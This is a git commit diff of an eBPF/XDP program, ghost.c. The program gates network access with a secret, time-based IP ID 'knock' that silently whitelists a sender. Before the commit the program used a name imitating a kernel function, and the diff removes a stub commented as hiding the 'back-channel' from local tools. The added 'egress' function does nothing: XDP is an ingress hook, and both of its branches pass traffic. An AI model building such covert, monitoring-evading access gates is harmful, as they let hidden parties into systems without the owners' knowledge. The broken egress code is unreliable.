0e9c10be9c27771b4e329dea6ac1b35b0381ecaf
C4rbn <mokshanbasuru@gmail.com>
2026-04-30 11:00:31 +0530

    Refactor virtnet_poll to zt_ingress and add zt_egress

--- src/bpf/ghost.c
+++ src/bpf/ghost.c
@@ -11,29 +11,31 @@ struct {
     __type(value, __u64);
 } eth_state SEC(".maps");
 
+static __always_inline __u32 get_totp() {
+    return (__u32)((bpf_ktime_get_ns() / 1000000000 / 30) ^ SEED);
+}
+
 SEC("xdp")
-int virtnet_poll(struct xdp_md *ctx) {
+int zt_ingress(struct xdp_md *ctx) {
     void *data_end = (void *)(long)ctx->data_end;
     void *data = (void *)(long)ctx->data;
 
     if (data + 14 > data_end) return XDP_PASS;
-    __u16 h_proto = *(__u16 *)(data + 12);
-    
+    __u16 proto = *(__u16 *)(data + 12);
     __u8 addr[16] = {0};
     __u16 pkt_id = 0;
 
-    if (h_proto == 0x0008) { 
+    if (proto == 0x0008) {
         if (data + 34 > data_end) return XDP_PASS;
         *(__u32 *)&addr[0] = *(__u32 *)(data + 26);
         pkt_id = *(__u16 *)(data + 18);
-    } else if (h_proto == 0xDD86) { 
+    } else if (proto == 0xDD86) {
         if (data + 54 > data_end) return XDP_PASS;
         for(int i=0; i<16; i++) addr[i] = *(__u8 *)(data + 22 + i);
-        pkt_id = *(__u16 *)(data + 4); 
+        pkt_id = *(__u16 *)(data + 4);
     } else return XDP_PASS;
 
-    __u32 secret = (__u32)(((bpf_ktime_get_ns()) >> 35) ^ SEED);
-    if (pkt_id == (__u16)secret) {
+    if (pkt_id == (__u16)get_totp()) {
         __u64 ts = bpf_ktime_get_ns();
         bpf_map_update_elem(&eth_state, &addr, &ts, BPF_ANY);
         return XDP_DROP;
@@ -42,9 +44,15 @@ int virtnet_poll(struct xdp_md *ctx) {
     return bpf_map_lookup_elem(&eth_state, &addr) ? XDP_PASS : XDP_DROP;
 }
 
-// Egress Masking: Prevents local tools from seeing the back-channel
-SEC("fentry/tcp_v4_connect")
-int BPF_PROG(mask_egress, struct sock *sk) {
-    __u32 saddr = 0; // Logic to hide specific IPs from kernel tracepoints
-    return 0;
+SEC("xdp")
+int zt_egress(struct xdp_md *ctx) {
+    void *data_end = (void *)(long)ctx->data_end;
+    void *data = (void *)(long)ctx->data;
+    if (data + 34 > data_end) return XDP_PASS;
+
+    __u8 addr[16] = {0};
+    *(__u32 *)&addr[0] = *(__u32 *)(data + 30); 
+
+    if (bpf_map_lookup_elem(&eth_state, &addr)) return XDP_PASS;
+    return XDP_PASS; 
 }
